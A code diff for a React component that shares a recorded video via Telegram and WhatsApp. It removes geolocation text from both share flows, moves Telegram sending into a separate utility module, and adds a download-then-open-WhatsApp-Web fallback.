@@ -199,50 +199,14 @@ const Index = () => {
     if (!recordedVideo) return;
     
     try {
-      // Convert blob to file for sharing
-      const response = await fetch(recordedVideo);
-      const blob = await response.blob();
-      const mimeType = blob.type || 'video/mp4';
-      const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
-      const file = new File([blob], `video_${Date.now()}.${extension}`, { type: mimeType });
+      // Import the separate Telegram sharing function
+      const { sendToTelegram: sendVideoToTelegram } = await import('@/utils/telegramShare');
+      await sendVideoToTelegram(recordedVideo);
       
-      // Get user location
-      let locationText = '';
-      try {
-        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 5000,
-            maximumAge: 60000
-          });
-        });
-        
-        const { latitude, longitude } = position.coords;
-        locationText = `\n\n📍 Местоположение: https://maps.google.com/maps?q=${latitude},${longitude}`;
-      } catch (locationError) {
-        console.log('Не удалось получить геолокацию:', locationError);
-      }
-      
-      const shareText = locationText;
-
-      // Check if Web Share API is available
-      if (navigator.share) {
-        await navigator.share({
-          title: 'Моё видео',
-          text: shareText,
-          files: [file]
-        });
-        // Navigate to success page
+      // Navigate to success page
+      setTimeout(() => {
         window.location.href = '/success';
-      } else {
-        // Fallback: open Telegram with text
-        const telegramUrl = `https://t.me/share/url?url=${encodeURIComponent(shareText)}`;
-        window.open(telegramUrl, '_blank');
-        // Navigate to success page
-        setTimeout(() => {
-          window.location.href = '/success';
-        }, 1000);
-      }
+      }, 1000);
     } catch (error) {
       console.error('Ошибка отправки:', error);
       alert('Ошибка отправки видео. Попробуйте ещё раз.');
@@ -259,39 +223,30 @@ const Index = () => {
       const mimeType = blob.type || 'video/mp4';
       const extension = mimeType.includes('mp4') ? 'mp4' : 'webm';
       const file = new File([blob], `video_${Date.now()}.${extension}`, { type: mimeType });
-      
-      // Get user location
-      let locationText = '';
-      try {
-        const position = await new Promise<GeolocationPosition>((resolve, reject) => {
-          navigator.geolocation.getCurrentPosition(resolve, reject, {
-            enableHighAccuracy: true,
-            timeout: 5000,
-            maximumAge: 60000
-          });
-        });
-        
-        const { latitude, longitude } = position.coords;
-        locationText = `\n\n📍 Местоположение: https://maps.google.com/maps?q=${latitude},${longitude}`;
-      } catch (locationError) {
-        console.log('Не удалось получить геолокацию:', locationError);
-        }
-      
-      const shareText = locationText;
 
       // Check if Web Share API is available
       if (navigator.share) {
         await navigator.share({
           title: 'Моё видео',
-          text: shareText,
           files: [file]
         });
         // Navigate to success page
         window.location.href = '/success';
       } else {
-        // Fallback: open WhatsApp with text
-        const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(shareText)}`;
-        window.open(whatsappUrl, '_blank');
+        // Create download link and open WhatsApp
+        const url = URL.createObjectURL(blob);
+        const downloadLink = document.createElement('a');
+        downloadLink.href = url;
+        downloadLink.download = `whatsapp_video_${Date.now()}.${extension}`;
+        downloadLink.style.display = 'none';
+        document.body.appendChild(downloadLink);
+        downloadLink.click();
+        document.body.removeChild(downloadLink);
+        URL.revokeObjectURL(url);
+        
+        // Open WhatsApp
+        window.open('https://web.whatsapp.com/', '_blank');
+        
         // Navigate to success page
         setTimeout(() => {
           window.location.href = '/success';
